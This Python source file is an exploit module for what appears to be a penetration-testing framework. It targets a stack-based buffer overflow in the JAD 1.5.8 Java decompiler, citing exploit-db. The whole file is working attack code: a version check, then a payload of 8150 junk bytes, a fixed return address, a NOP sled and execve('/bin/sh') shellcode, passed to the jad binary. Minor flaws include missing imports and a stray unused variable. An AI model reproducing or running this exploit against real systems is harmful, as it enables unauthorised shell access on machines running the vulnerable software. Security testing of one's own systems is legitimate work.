from subprocess import call
from os import errno
from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "JAD Buffer Overflow",
                "Module Author": "Josue Encinar",
                "Exploit Author": "Juan Sacco",
                "Description": "JAD 1.5.8 Stack-Based Buffer Overflow",
                "Reference": "https://www.exploit-db.com/exploits/42076/",
                "Arch" : "X86"
                }
        options = {}
        super(BoomerModule, self).__init__(options,info)
               
    def check(self):
        try:
            response = Popen(["jad"], stdout=PIPE, stderr=PIPE).communicate()[0]
            if b"Jad v1.5.8e." in response:
                self.print_ok("Vulnerable")
            else:
                self.print_error("No Vulnerable")
        except:
            self.print_error("JAD no found")

    def run(self):
        junk = b"\x41" * 8150
        nops = b"\x90" * 24
        payload = self.options["payload"][1]
        if not payload:
            shellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
        else:
            self.print_info("To fix this option.")
            shellcode = self.payload.get_shellcode()
            sshellcode = b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
        esp = b"\x18\x2e\x0e\x08" 
        buffer = junk + esp + nops + shellcode
        try:
            self.print_info("Trying to Overflow JAD")
            call(["jad", buffer])
        except Exception as e:
            self.print_error(e)